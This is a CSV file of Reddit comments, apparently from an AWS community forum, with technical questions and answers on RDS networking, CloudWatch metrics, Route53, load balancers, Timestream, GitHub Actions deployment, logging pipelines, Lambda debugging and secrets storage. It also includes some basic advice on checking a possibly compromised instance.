comment_id,post_id,comment,upvotes
g8plxz7,jahpkg,Connection refused tells me the first place to look is allowing the whole subnet ecs is running on or the security group ID to connect to the rds on 5432,1.0
g8plzzz,jag7yo,If you're doing government work there has to be at least some sort of NIST requirement,1.0
g8pnsmm,jadohz,"You can do it but remember about the egress costs in AWS. Also there is no 10x difference. Do remember with AWS you have saving plans and spot instances, you should scale rather than run huge machines and most importantly AWS has more powerful processors (like 3ghz Vs 2ghz) so intl the end the difference won't be that big.
If you choose spots you can pay less than on Hetzner for machine that is much faster.",2.0
g8p2tbm,jadohz,"You can do this - you just have to adopt a ""zero trust"" mindset and not rely on the network as your only access control mechanism.  Allowing trusted IPs only is necessary, of course.  But also really make sure you have good protections against leaking credentials, and proper permissions.  If you have sensitive data, you can do the encryption and decryption in your application rather than the database so even if it's compromised the data remains secure.

You won't pass many regulatory auditor checks with this configuration, though, so if that's a factor you'll need to consider other options.",1.0
g8owqqf,jadisj,"If you click on the ""graphed metrics"" tab is that something like `sum` or `max`?",2.0
g8oz2vd,jadisj,"I played with those values but to no avail. I set it to avg on 24 hours, and the numbers remain way too low.",1.0
g8p9sa4,jadisj,"I just tested a similar scenario over my account and I got the same values between SES stats and Cloudwatch Events using this config:

 https://imgur.com/7rUfRay 

Note the ""Period: 1 day"" and the ""Sum"".

Least but not least, have you checked if you're in the right region? Sometimes it happens :)

&amp;#x200B;

Edit: added external link to image due reddit post image issues",2.0
g8plurb,jadisj,"Thanks, I thought I checked sum, that makes sense yes!",2.0
g8oyb37,jadi6c,"Downloading data is mostly a 1-way transfer. You’ll be charged for 1GB transfer to the internet (out). 

If you were uploading 1GB of data to the instance, that transfer would be free. Off the top of my head, all data transfer in to AWS is free.",2.0
g8pssku,jadi6c,Indeed. Thanks for the clarification!,1.0
g8ov0us,ja5oyh,"&gt;I worked at the factory that built the aws servers.

Interesting ...",1.0
g8p2ad1,ja9u5n,ELK?,2.0
g8p3ili,ja9zsb,"Like another posted commented, your solution is going to involve a private hosted zone on Route53.  You will simply create a record(A?) with ""server.local"" pointed to the private IP address of your EC2 instance.",3.0
g8oq6jp,ja9zsb,https://docs.aws.amazon.com/vpc/latest/userguide/vpc-dns.html#vpc-private-hosted-zones,1.0
g8pmedv,jab71r,Fsx is the AWS service you want. It's not elastic like EFS but you can expand it later. And you will need to join it to an Active Directory domain.,1.0
g8onhk4,jaaqr8,"You’re looking for private integrations using VPC Link

https://docs.aws.amazon.com/apigateway/latest/developerguide/set-up-private-integration.html",2.0
g8olq0j,ja8oca,"Wouldn't application load balancer's path based routing be a good candidate for this?

domain.com -&gt; ALB [path based routing for link1,link2,link3] -&gt; ELB1,2,3",2.0
g8omzih,ja8oca,I think this is the best answer.  Route them all to the same ALB and then use the path rules in the ALB to redirect to separate target groups.,2.0
g8oo24u,ja8oca,"100% this, unless there’s some governance or otherwise silly reason that the flows can’t go through a shared load balancer.",2.0
g8oi3tk,ja8oca,Cloudfront and maybe global accelerator.,1.0
g8ofeis,ja822t,You still have the more advanced path/host etc based routing in an ALB that can direct based in layer 7. NLBs offer nothing of the sorts.,2.0
g8oligs,ja822t,"NLB’s can have elastic IPs attached, to have static public IPs.",1.0
g8p3rj6,ja8hg3,This is a big question that a lot of us are wondering about.,1.0
g8p52d0,ja8hg3,We currently use InfluxDB and are a bit curious about this as well. InfluxDB has been seriously awesome though. Super fast. We use their fully managed service InfluxDB Cloud v2. Their support for the service is also fantastic. One Timestream limitation I noticed was the inability to backfill data after it left the in-memory store. That could be quite tricky.,1.0
g8psmdj,ja8hg3,"We use influxdb and have been waiting for timestream to come out for a long time.  The day it came out we moved some metrics to send to both influxdb and timestream to compare.  We do all our visuals in grafana.

\- Timestream query syntax is sql style, familiar for most developers, the grafana UI isn't great for making queries for those who don't know it though.  Influxdb interface for making queries is easier in grafana.  
\- Timestream queries are SLOW, maybe its my poor SQL implementation of my metric searches, but the query performance when loading a dashboard is abysmal for timestream compared to influxdb.  
\- Expensive $$$ we moved only a small set of metrics over to timestream and we're looking at about 120$/mo for them, we have easily 300x those metrics in influxdb and there's no way we could afford that.  


Overall pretty disappointed, we had been waiting a long time to remove influxdb from our management plate and it seems we will not because of the cost + query performance.",1.0
g8ocpvh,ja6uqm,"Draw a square with 2 lines.

It doesn’t make sense to do so. Go back to the customer and tell them a functional test would be a better fit.",1.0
g8omy8p,ja6uqm,"How about using the local option?

[step function local](https://docs.aws.amazon.com/step-functions/latest/dg/sfn-local.html)

You can then use your service integration mocks to assert that the correct endpoints get called with the right payloads.",1.0
g8ow6ls,ja6uqm,I like this. I haven't messed with the local runtime though but sounds like a great option. Thanks.,1.0
g8orhxp,ja48p9,"Anything you want, it's a label",1.0
g8o5loh,ja4b5e,"AWS employees wouldn’t access your instances at all.

You could try to research, but honestly, change your password if you haven’t already and take it as a lesson learned. Also, enable MFA on your email account and any 3rd party services that support it. Check your deleted emails / archives as well to see if perhaps tried to reset 3rd party sites via password reset requests if they managed to actually get into your email.

There’s a lot of variables at play here to understand exactly how someone could’ve gotten in (or if it was just a random coincidence).",3.0
g8on1se,ja4b5e,"Done, thanks. How can I tell if someone SSHed in? It said the last login was that day but I'm not completely sure if it was me or not.",1.0
g8onbid,ja4b5e,/var/log/auth.log should show SSH logins. You can check in there for any login attempts / successful logins.,1.0
g8okk3d,ja4b5e,"You can scan volumes using [assorted tools](https://www.tecmint.com/scan-linux-for-malware-and-rootkits/) to look for rootkits and other exploit files put onto a volume. Most hacked servers are just going to deploy some detectable rootkit binaries.

AWS GuardDuty can detect \_some\_ misuse of network traffic coming from exploited instances. Tools like AlertLogic will actually inspect the network packets and can detect a whole lot more - but they're also quite a bit of $$$.",1.0
g8ov2df,ja4b5e,"Chkrootkit found like four suspicious files and directories, and one file I checked seems like a mix of encrypted and plain text when I `cat` it (it's in a /usr/lib/modules/.../vdso/.../&lt;string of random letters and numbers&gt;.debug file). Rkhunter found nothing.",1.0
g8nn99r,ja3qx9,"like their other UI updates, it is complete shit.   it's less shit than R53, but still utter shit.",4.0
g8nj5h1,ja3qx9,better than the R53 UI :),2.0
g8now1q,ja3qx9,"With all the new UI bullshit, I have to run the browser maximized to be able to change something. Complete waste of space and too many steps introduced everywhere.",2.0
g8nrzvo,ja3qx9,"The instance info tabs are too disbursed.

I have to visit three tabs to get the same information I could have gotten in one before.

The lazy loading is annoying and half the time I never see 2/2 checks, just spinning circles.

Opening new pages for everything instead of models is an awful design decision and I genuinely don’t understand why they would do this for so many reasons.

Probably the most annoying things is super strange behavior with searching and going between pages.

I went back to the old UI last week after trying to like the new UI for a month.",1.0
g8o5oid,ja3qx9,The only thing I like is that you can see all the instances volumes in a single view without having to mouse over and open each individually in a new tab.,1.0
g8ndf8x,ja2i76,NLB listening on UDP and forwarding to Fargate? Still serverless although not Lambda.,2.0
g8o0c17,ja2i76,I'd call that 'quasi' serverless.  Still running a docker container on fargate or EKS which is still on EC2 and billed as such.   Really like the transactional model vs the application model.,1.0
g8opqul,ja2i76,"UDP is stateless, so how will you know when one message begins and the other ends? Will Lambda fire and process each individual packet?",0.0
g8ndu8g,ja0cdc,"Different regions? Wouldn’t that be the same template, just deployed to multiple regions? Or use conditions to decide when to deploy resources to certain regions. 

I generally have 1 template and many deployment property files (one per region/env/client) which dictate all the unique parameters for that given combination. 

Then build tooling to auto deploy based on the deployment properties file provided.",2.0
g8onwtw,ja0cdc,"How does that build tooling look like? I have used ansible to wrap cloudformation templates so as to use ansible variables per role and flyway to manage database operations on newly spun up db clusters. I've changed jobs since then and I'm trying to figure out what repo structure and tooling makes sense for a startup with multiple clients, different aws accounts per client. Cloudformation and jenkins are the only tools which they have already.",1.0
g8n33uj,ja1k9g,"This is nice work.  I love that you added `publish_dir`. 

One suggestion - offer what permissions are required for the keys.

I am not familiar enough with GH actions; could one add this onto the output from another action?  eg building a Gatsby site and uploading it with back-to-back actions?",12.0
g8n4sud,ja1k9g,"&gt;One suggestion - offer what permissions are required for the keys.

Great idea! This may take some probing to figure the minimum set of permissions required but I'll add it in.

&amp;#x200B;

&gt;could one add this onto the output from another action?

Yep, you just need to create a CI workflow that executes both actions sequentially. [Here's a workflow](https://github.com/onramper/docs/blob/dev/.github/workflows/build-deploy.yml) that generates a static documentation site with mkdocs and pushes it to AWS. We generally hook it up to react builds or other static site generators.",5.0
g8nhudq,ja1k9g,"Thanks for the workflow link; that's a nice example!

&gt; Great idea! This may take some probing to figure the minimum set of permissions required but I'll add it in.

Yeah, that's not going to be a 2min job; but would be wonderful to include with the specifications.  I have an exact need for this so I may start down the road of minimum viable permissions.  If so, I'll send a PR.",3.0
g8ogkyt,ja1k9g,I'd really appreciate a PR. Otherwise I'll get to it in a few days :),1.0
g8n17pv,ja1k9g,"What's special about it is that it handles everything:

1. Creates a new cloudformation stack
2. Spins up an S3 bucket
3. Requests an ACM certificate
4. Creates a Cloudfront distribution
5. Sets records on Route53
6. Invalidates Cloudfront's cache if there's a previous deployment",11.0
g8n4fgi,ja1k9g,"For a newbie, can you explain how to setup? And how do you make cloidformation execute?",4.0
g8n5kgz,ja1k9g,"1. Create a new IAM role and get it's ACCESS\_KEY\_ID and SECRET\_ACCESS\_KEY
2. [Store these keys as github secrets on your repo](https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)
3. Create a new CI workflow (actions tab -&gt; New workflow)
4. Add a step that generates the static page (optional). eg: `npm run build` for react SPAs
5. Add this action as another step:
```
- name: Deploy to AWS
  uses: onramper/action-deploy-aws-static-site@v1
  with:
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    domain: your.domain.com
    publish_dir: ./build
```



&gt;And how do you make cloidformation execute?

It is automatically executed, there's no need to do anything special",7.0
g8nk9ru,ja1k9g,CDK ❤️,4.0
g8ns4gy,ja1k9g,Any estimate on what this costs to run per month?,3.0
g8o3ul1,ja1k9g,Will depend on how much traffic you get. You’ll be charged for S3 access (for cloudfront to fetch it and cache it) and then cloudfront’s transfer fees,3.0
g8nurwp,ja1k9g,Does your upload to s3 task modify unchanged files? AKA do you compare timestamps?,1.0
g8oghxe,ja1k9g,"Internally the upload uses [@aws-cdk/aws-s3-deployment](https://docs.aws.amazon.com/cdk/api/latest/docs/aws-s3-deployment-readme.html), which uploads all your contents to an intermediary bucket and then runs `aws s3 sync --delete` against the website bucket. In other words, unchanged files shouldn't be modified but the bandwith cost is still there if you are dealing with large uploads.",2.0
g8pex80,ja1k9g,Worth adding to https://github.com/sdras/awesome-actions?,1.0
g8o48k1,ja1k9g,Pretty easy to do the same thing with bitbucket pipelines.,-4.0
g8msh5u,j9yy2b,It's not a domain problem since you are getting a server response. It might be a wrong server but oh well. Use dig (or some online lookup tool) to check if you're getting IP of your server. If not wait up to two days and try again. If you do get your own server check the logs.,1.0
g8myli2,j9yy2b,Thank you,1.0
g8mti1j,j9yy2b,Looks like a config issue setting up a hosted website using a s3 bucket,1.0
g8mymut,j9yy2b,Any ideas how can I check or fix the issue?,1.0
g8mtmdl,j9yy2b,"That looks like an s3 permission error. Are you hosting in s3?

You've got the bucket permission wrong. There have been a lot of changes recently in buckets to prevent people leaving them open by mistake. I didn't read your guides but one is probably out of date and you haven't made your bucket public.",1.0
g8myouc,j9yy2b,"ok, thank you I will check it out",1.0
g8mz2c4,j9yy2b,"Check your S3 bucket permissions.

\&gt; Ensure ""Block *all* public access"" is set to ""Off"" under the permissions tab.

\&gt; Select both of your **index.html** and **error.html** files from inside your bucket, click on the ""Actions"" drop down menu and choose ""Make public""",1.0
g8p8mp5,j9yy2b,"Thank you, did what you said and so far it worked but on a different link. It works on the link starting with [https://s3.amazonaws.com/domainname.com/sitefile/index.html#](https://s3.amazonaws.com/eterikhomeandbeauty.com/Eterik-main/Landing%20page.html#) not the end point link or the actual domain.",1.0
g8pthcx,j9yy2b," A couple more things to check.

Does your S3 bucket name 100% match your website name?

Have you created an A record inside of Route 53 that points towards the S3 bucket?",1.0
g8pupeu,j9yy2b,"Yes, my S3 bucket name matches 100% my website name and yes, there is an A record inside my Route 53 that points the S3 bucket.

But my endname for both buckets come up the same error message.",1.0
g8mch3p,j9wywj,You probably want to create [Managed policy](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-iam-managedpolicy.html) instead.,3.0
g8mi6gb,j9wywj,Thanks Martin. That looks better!,1.0
g8m8p0a,j9wl03,"I think I was reading exactly what you were asking last week.  search for "" Alternatively, you can mix and match static names with stage variables in the integrations. "" in this doc:

[https://aws.amazon.com/blogs/compute/using-api-gateway-stage-variables-to-manage-lambda-functions/](https://aws.amazon.com/blogs/compute/using-api-gateway-stage-variables-to-manage-lambda-functions/)

&amp;#x200B;

I'm assuming you are talking about Lambda aliases. HTH.

&amp;#x200B;

EDIT: Note it also looks like you have to use the CLI to give the API permission to read the Lambda Aliases.",2.0
g8mbmof,j9wl03,"Thanks, but that example is for a REST API, not a HTTP API.",1.0
g8oz5cg,j9wl03,"Dang, sorry. So close, yet so far.  :)",1.0
g8m6la9,j9tkwd,"The “standard” record should be set as Default geolocation record. 

What’s the backend?  If you’re just running an EC2 instance, easiest way might be to install the block on the server.  e.g. https://www.ip2location.com/free/visitor-blocker",1.0
g8mtltd,j9tkwd,Which counties do you need to block,1.0
g8mzv4o,j9tl68,Nice video!,2.0
g8n1ihx,j9tl68,Thanks! Appreciate it.,1.0
g8ma2ti,j9tl68,Thanks for sharing.,1.0
g8n1iyz,j9tl68,You're very welcome. Hope you enjoyed.,1.0
g8m88cj,j9tpp9,Anything that can only be accessed privately has to go through something like DC or VPN.,1.0
g8mewdy,j9tpp9,How do you lock something down to only DC or VPN access?,1.0
g8n0zp8,j9tpp9,You only allocate a private IP ...,2.0
g8m8eeb,j9tpp9,"You should be able to create an ALB which is internal instead of internet-facing, which will only accept traffic from resources from inside the vpc, ensure the security group lists the resources that need to have access to it. 

Not sure why you would put cloudfront in front of S3 for an internal resource. Remove public access from the bucket and apply a bucket policy instead and list which services/ resources are allowed to access the bucket.",1.0
g8mfs37,j9tpp9,"What if someone isn't in a VPC? Is there a way to specify a rule that says ""if the user is on the corporate network?""",1.0
g8mx7qr,j9tpp9,"If the ""corporate network"" is on premise then you can look into site-to-site VPN and then direct the traffic from the vpn with a route table to the subnet of your ALB. Google ""Aws vpc to on premise"" and you'll see a few articles on this. (Else you can use vpc peering to connect to another vpc)",1.0
g8n4av3,j9tpp9,Thank you!,1.0
g8moqiv,j9uaia,"We're using Datadog, and are very happy with it. Mind you, our log volumes are fairly small and therefore not too expensive. The combination of logs, metrics and traces in one place is very nice. Alerting to PD is straight forward.

One cool feature of Datadog is their ""logging without limits"" concept, where you can just blast all your logs to Datadog, but then opt some of them out of indexing, and therefore also not pay for them. Their ""live tail"" feature lets you see them in the UI in real time, though, and you can easily flip a switch to make all logs go to the index for a period of time, say if you're debugging something special. Nifty.

Docker containers on ECS are configured with the AWS FireLens (i.e. Fluent Bit) side-car container, shipping logs directly to Datadog. ECS task and container metrics are picked up by the Datadog agent, also running as a side-car container.

Other than that, you can have various other services (like RDS, CloudFront, etc) log to CloudWatch Logs, and with some recent features you can integrate it with Firehose and send it directly to Datadog. Before, you'd have to run the Datadog Lambda to periodically scrape CloudWatch Logs, urgh.",2.0
g8m4n3n,j9uaia,"The logging pipeline in our company handles TBs of data daily. The idea might not be perfect but it works fine for us atleast :p

The logs are forwarded using FLUENTBIT and not filebeat. Reasons include resource consumption. The company was actively moving on serverless (ECS Fargate) so log forwarder had to run as a sidecar instead of daemon

Fluentbit dumps logs in Kafka. Why kafka? Handle Bursts and ensure that we don't miss logs or don't fill up the buffer of log forwarder. Another benefit is that we can have multiple consumers of the same message (eg. 2 consumers for dumping message to ES and S3)


We have multiple logstash containers running in ECS fetching logs from Kafka, stashing them and dumping to Elasticsearch.

Would like to know your views also on this !!",1.0
g8nzs9v,j9uaia,"We use function beat for ingesting various log groups from cloudwatch directly to ELK. Function beat is a bit limited but it does support a variety of AWS service logs that go to cloudwatch. Therefore, if your service falls under that list then function beat is a great option. Probably not exactly what you wanted but thought it worth suggesting.",1.0
g8p5u3m,j9uaia,Graylog is nice. There is pager duty plugin or you can use webhooks based on conditions,1.0
g8m63ug,j9uaia,"Cloudwatch Logs Insights beats ELK every day of the week and twice on Sundays, IMO. Only thing better is Splunk and it’s expensive.",1.0
g8mdgjv,j9uaia,"It would be helpful if you'd explain *why*, in your experience it beats ELK.",4.0
g8mpjie,j9uaia,"Unstructured search, search time parsing to  name the first couple things that come to mind.",1.0
g8mjbt7,j9uaia,"Oh yes, please explain. People make fun of me when they see the rudimentary cwli console and tell me ""get ELK"".",3.0
g8mpy12,j9uaia,"Probably people that just want to create graphs and dashboards from structured data that they’ve painstakingly parsed through their logstash/filebeat configurations.

For those that want to rip through logs (developers) and just want something approaching the power of the *nix cli for text processing/searching/extraction/transformation without having to spend ridiculous amounts of time planning in advance for the outage nobody saw coming ... Insights and Splunk reign supreme, imo.",1.0
g8my67h,j9uaia,"I manage a set of microservices and we're using Cloudwatch -&gt; Lambda -&gt; Elasticsearch. But we're having problems due to the data migrated and the cost of ES, so we're changing all our grafana boards to use only the CW Insights to manage the business metrics. basically, ES costs us 10 times more than using CW only.",2.0
g8n0yao,j9uaia,That too...,1.0
g8m31cn,j9uybz,"Are both being called by Terraform?

If so nothing is stopping them running concurrently, an appropriate delay may be in order.

The question does make it sound, like you are using terraform to start an instance, which user data then calls the SSM doc? if thats the case the SSM doc would likely be started before instance is completed restarting from the name change.

I havent done this exact thing before but this is the way i understand it.",1.0
g8m47be,j9uybz,Terraform is what’s doing the SSM document association. Unsure how to delay the attachment process with Terraform.,1.0
g8m9aqd,j9uybz,"It’s asynchronous. You have to plan for this and add semaphores, etc. into your scripts.",1.0
g8m21h2,j9v425,"S3 tiers other than standard have a minimum retention price. You are charged 90/120/etc days even if you delete it. You shouldn't be deleting data in glacier as rclone should not upload unchanged files, and your strategy shouldn't involve backing up files that will be deleted, thats not how archives work. 

If you have files that will be deleted, use s3 standard and set a transition to glacier after X days to save cost.",2.0
g8m35gk,j9v425,"I'll look in to this, thanks :)",1.0
g8m20vo,j9v425,"Inbound data won't cost a thing. Only early deletes, downloads, or cross region replication.",1.0
g8lxdnm,j9uxfv,"Try setting the concurrency to 0. Then look in your logs, and find out where the code is breaking. Every time it fails, it might be retrying with same code.",4.0
g8m31qp,j9uxfv,"Thank you for your response! I've checked and I don't think the code is breaking. However, I have noticed each time the function is invoked, it's invoked 3 times. I've got a CloudWatch Event rule to trigger ever 2 minutes.  However, I have noticed in my logs that it's invoking my function 3 times per minute rather than 1 per 2 minutes. I'm puzzled at to what is causing this. I set concurrency to 0 and nothing was invoked and then I bumped it to 1 to start invoking and it is now doing 3 per minute.",1.0
g8mp0f6,j9uxfv,"Have you tried to run it offline in a docker image on your local computer? That way you can debug it and figure out what's going on.

edit: I'd comment everything out on the lambda function, then just have it run successfully. After that, I'm betting it won't trigger again and you can properly look into it.",1.0
g8ot65q,j9uxfv,"Yea, I run it offline for testing and such. It runs through as normal. It's very bizarre, it runs every 20 seconds rather than once per 2 minutes my rule.  Nothing is failing within the function and the logs show it starting and ending, but is just starting every 20 seconds.  It's very bizarre.",1.0
g8otzyd,j9uxfv,What are you coding in? Python?,1.0
g8p4cc7,j9uxfv,JS / Node,1.0
g8p53qs,j9uxfv,"Damnit, I thought I might be able to help. I'm a Python person.",1.0
g8p5g1h,j9uxfv,Oh well I appreciate it anyway! I even disabled the rule and it's still invoking. So bizarre.,1.0
g8p52on,j9uxfv,"I would note, I have commented everything out and just a console log and it's still invoking every 20 seconds.",1.0
g8p5e19,j9uxfv,"My other thought is to check if you have a scheduled event that is triggering it? I'll duck out now, good luck with it.",1.0
g8pegx1,j9uxfv,"Well, I thought that too but I revoked all permissions and yea... still going.",1.0
g8ly1ya,j9uxfv,Log the event at the start. You should be able to work it out from that.,2.0
g8m1x79,j9uxfv,"- Edit concurrency 
- Reserve concurrency = 0 
- Save

EDIT: looks like /u/wagwagtail already said this.",2.0
g8luuwo,j9syoz,"I had a similar situation where I created a new namespace while keeping the old one. Then ran an update to switch which namespace was being used by creating a new service and node. Then I ran a delete of the old namespace.

Also - you might want a Virtual Router for 1. [https://www.appmeshworkshop.com/servicediscovery/virtualrouter/](https://www.appmeshworkshop.com/servicediscovery/virtualrouter/)",1.0
g8mbtht,j9s9te,Or try to use an graph adapter library for DynamoDB. Or try out Cloud Directory if it fits your use case,1.0
g8md6jp,j9s9te,"&gt;Cloud Directory

That’s a great stuff — it seems to fit most of what I am looking for. I didn’t knew about that. Thanks!",1.0
g8lqnid,j9s5xz,"**URL:** [https://www.tastoid.com/](https://www.tastoid.com/)

A web app to get personalized movie and TV recommendations based on your mood/taste

**Technologies Used:** Beanstalk, S3, Cloudfront, Redis, RDS, AWS Elasticsearch",5.0
g8mdh9z,j9s5xz,"URL: [https://www.eli5.org](https://www.eli5.org)

(Heh, sorry for the splash page, still in beta and not publicly available yet).

**Technologies Used:** S3, CloudFront, RDS, Elasticsearch, Translate, Lambda, and all the wonderful things :)",2.0
g8m7ih1,j9s5xz,"Working on latest version (1.2) of [https://github.com/formkiq/parima](https://github.com/formkiq/parima), to easily launch and update sites in S3/CloudFront using either AWS CLI or a Git repo.

It's nice to work on something that will improve our own build/deploy flow, as well as hopefully help everyone else. :)",1.0
g8o8i6l,j9s5xz,Setting up a custom AWS Config rule to check all resources for specific compliant tags. The tags will be used as cost allocation tags for better cost reporting. Trying to make sure no resources slip through the cracks.,1.0
g8lowkg,j9s5xz,Confusion and sadness,1.0
g8lfn49,j9s4pm,pass the `--version` in when you run eksctl,1.0
g8lfslp,j9s4pm,"I tried that and it states ""Error: cannot use --version when --config-file/-f is set""",1.0
g8lfzr2,j9s4pm,"Here's the schema for it

https://eksctl.io/usage/schema/

looks like

    metadata:
      version: ""1.17""",1.0
g8lmpmw,j9s4pm,That was it. The quotes were the key. You also need to make sure that your eksctl version is up to date!,1.0
g8lmvn9,j9s4pm,ya yaml is funny.. if it started with a v like `v1.17` yaml would parse that as a string even with no quotes. The go struct for eksctl probably expects only a string to be passed in. without the quotes it comes in as a float or decimal,1.0
g8lwpcu,j9rh4z,"I've been using SSO as much as I can wherever possible. Any situation where I need cross-account automation-type access I just use CodePipeline or Cloudformation StackSets as this is their intended purpose.

That said, it's not mutually exclusive. You can still have AWS SSO for most users while retaining an older pattern too, like an identity account for privileged administrators with IAM Users and lots of cross-account AssumeRole access.",1.0
g8oc566,j9rh4z,"&gt;I've been using SSO as much as I can wherever possible. Any situation where I need cross-account automation-type access I just use CodePipeline or Cloudformation StackSets as this is their intended purpose.  
&gt;  
&gt;That said, it's not mutually exclusive. You can still have AWS SSO for most users while retaining an older pattern too, like an identity account for privileged administrators with IAM Users and lots of cross-account AssumeRole access.

Nice point of view, I agree with you!  
The problem to maintain the credentials of the IAM User secured still remains to me, and that's why I made the open-source project.",1.0
g8mijk3,j9rh4z,We want to restrict access to AWS by IP. SSO doesn’t make this easy,1.0
g8oc1hi,j9rh4z,So it's needed to use AWS only has an internal purpose?,1.0
g8lcr0z,j9rh4z,AFAIK there is no way to switch accounts using the CLI with SSO (MFA enabled) without manual Interactions. Since we rely on a lot of scripting and cross/multi account deployments we have no other choice but to use IAM users and switch roles.,0.0
g8lj3ch,j9rh4z,"On Leapp this will be a feature! There is a feature because there are many developers in this situation  
[https://github.com/Noovolari/leapp/issues/26](https://github.com/Noovolari/leapp/issues/26)  


The problem to me is: how do you secure locally your access and secret key locally?",1.0
g8lj7fz,j9rh4z,What's the reason aren't you using AWS SSO?,1.0
g8lgexp,j9oj4k,Check out the aws elemental suite of services,3.0
g8lek1r,j9nm1z,"Would also like to know. I haven’t used timestream yet, but it always struck me as an odd product next to cloudwatch metrics. I don’t understand the hype yet.",1.0
g8nm3xt,j9nm1z,Time stream is a general purpose time series database. CloudWatch has a more specific use case.,1.0
g8l9k6w,j9r1nl,"Configure ssm and forget about bastions forever. 

In a pinch, configure ssm on your bastions only for now and use 


https://github.com/gjbae1212/gossm",3.0
g8nfmg9,j9r1nl,"In a windows environment, SSM isn't as helpful as an RDP bastion. We have a few legacy applications that need direct database access to run/use, so those have to run from a bastion server. We have a custom made web application for our staff, so we tied it into that. user authenticates into the app (Cognito) and during the login step in our application, it checks if the user has certain bastion permissions attached. If so then it adds their IP to the security group for the Bastion server. There are 3-4 of these servers in different regions, and a user can be opted in/out to them individually. 

&amp;#x200B;

The code just pulls the current configuration of the SG, iterates it to see if the username of the current user is already in it. If they are, it checks the IP to see if it matches the one they are currently logging in from. If yes, nothing to do. If not, remove it and re-add with the new IP. If it doesn't exist, then add it. 

&amp;#x200B;

So far it's working pretty well for us, and a LOT less ""can you add my IP"" tickets ;)",2.0
g8la2r0,j9r1nl,"1) use SSM if possible. 

2) AWS Prefix Lists maybe?",1.0
g8milrc,j9r1nl,AWS firewall manager,1.0
g8l6ool,j9qktx,"If you're just hosting a wordpress site that you intend to be up 100% of the time, I would not recommend using a regular EC2 instance.

Rather use light sail: [https://aws.amazon.com/lightsail/projects/wordpress/](https://aws.amazon.com/lightsail/projects/wordpress/)",3.0
g8l7b63,j9qktx,"Lightsail also looks good. 
So, what security measures would you recommend if I use Lightsail?",1.0
g8lftrn,j9qktx,[https://lightsail.aws.amazon.com/ls/docs/en\_us/articles/security](https://lightsail.aws.amazon.com/ls/docs/en_us/articles/security),1.0
g8lk5k5,j9qktx,"Seems like AWS takes care of the maintenance and security of the server where my website is stored.

All I have to do is keep my account passwords secured, along with root password, API key and front-end securities.",1.0
g8lbvsi,j9qktx,"If all you're doing is WordPress why not just use a service that has WordPress already installed for you? Are there specific reasons to add the complexity here? (There are valid reasons, but typically WordPress can be hosted pretty cheap and easy)",2.0
g8lcgk5,j9qktx,"&gt;why not just use a service that has WordPress already installed for you?

You mean Web Hosting?
I am using AWS because it'll cost me cheaper.",1.0
g8lfx70,j9qktx,"\&gt;I am using AWS because it'll cost me cheaper.  


This is categorically untrue.",3.0
g8lhg3b,j9qktx,"Why? If I use Lightsail, it'll cost me 3-5$/month and any decent Web Hosting will cost me at least 10$/month.

And if I host a big Website with lot of visitors. Then Lightsail's highest plan comes at 160$/month, while most Web Hosting providers charge 600$/month for same configurations.",1.0
g8lk4cb,j9qktx,"Managing your ec2 instance, aws and Wordpress security will cost you more than the $5-7 a month difference in your labour. Find a service that does everything for you.",2.0
g8lki5s,j9qktx,"You mean if I use services like Guard duty, Cloudwatch, etc. 

Do I really need those services?",1.0
g8lrdlc,j9qktx,"Lightsail is the comparison, people are referring to using a standard EC2 instance.",1.0
g8lisep,j9qktx,Agreed you can do WordPress.com hosted instances for next to nothing. And they don't require any scaling just a flat per year rate. If you don't need to stand up a server for anything else you'll end up paying more for aws for sure.,1.0
g8lrspk,j9qktx,WordPress.com is just not Good.,1.0
g8ls4jn,j9qktx,"Why? It's cheap and functional. There are certainly things you can't do there - which makes sense if there was something you needed that they didn't offer...but it's cheap secure and functional. Your question and comments were around security and cost, and that would punch those buckets. Lightsail is also secure as long as you stay on top of it, but it's going to cost more.",1.0
g8m2pjk,j9qktx,[deleted],0.0
g8nf2kf,j9qktx,"That’s a very immature thing to say. Mommy bloggers make good money! 

Also, self-hosting on AWS is a fool’s errand. Spend more money for a worse product and get hacked in six months when you forget to update? Wow, shoulda asked your mom for advice.",1.0
g8l515g,j9nlew,"Avoid storing secrets in any place that's not specifically designed to store secrets.

One common approach to this is using the [SSM Parameter Store](https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html) \-- it can store secrets. Then assign your EC2 instance(s) an [IAM Role (Instance Profile)](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html) that is allowed to access those secrets (using `aws ssm get-parameter` or the SDK). Your code / repository / EC2 instance then only contains the parameter's name, no secrets.

SSM-PS is free of charge for most use-cases.

You're on the right track to keep Ec2 instances as ""throwaway"" as possible; using CodeCommit (or any other source control) is always a good idea.

Once you've settled in, take a look at Lambda. It's perfect for many ""small jobs"" / scripts.",5.0
g8l56hw,j9nlew,"Modify your scripts, so they get the parameters from SSM Parameter Store or Secrets Manager.",4.0
g8l5kgn,j9nlew,I recommend you put secrets in Secrets Manager or SSM Parameters and look them up during script invocation or load into the script user environment during bootstrap.,3.0
g8l5wwo,j9mmbf,"If developers are not willing to accept responsibility for how the product works once deployed, their involvement needs to be minimized even more: remove them from the project.",6.0
g8p2iff,j9mmbf,"They're relatives of the founder, so...

Any suggestions for my question?",1.0
g8l5cys,j9mmbf,Would go with cache invalidation. It exists for a reason.,2.0
g8p2f5h,j9mmbf,How do you invalidate &gt;3k objects? I'm sure we would never reach that limit. But I'm curious.,1.0
g8l7xri,j9mmbf,"I’m confused. You mention both EC2 and S3. Is this a static site? If so, why not just go with Netlify, or a similar service, and avoid this hassle?

Also, if you’re the “cloud guy,” why did you give other folks enough access to bring the site down? Lock them out, or put them on their own EC2 instance.",0.0
g8p2cva,j9mmbf,"""new cloud guy"". I just joined. And they are actually grumpy because I took away their freedom of playing around in the same server as the website.

It is a static site. I considered Netlify. But again, it's a small team. So for now, I'd prefer to keep everything inside AWS.",1.0
g8l0bwv,j9p5qq,"Author here. We're a startup that use AWS quite extensively. I wrote this to share something pretty exotic that we do. While this was under development I couldn't find many resources on the topic. I was quite worried that we were doing something crazy, but in the end worked out.

If there are any questions I'm happy to answer them.",8.0
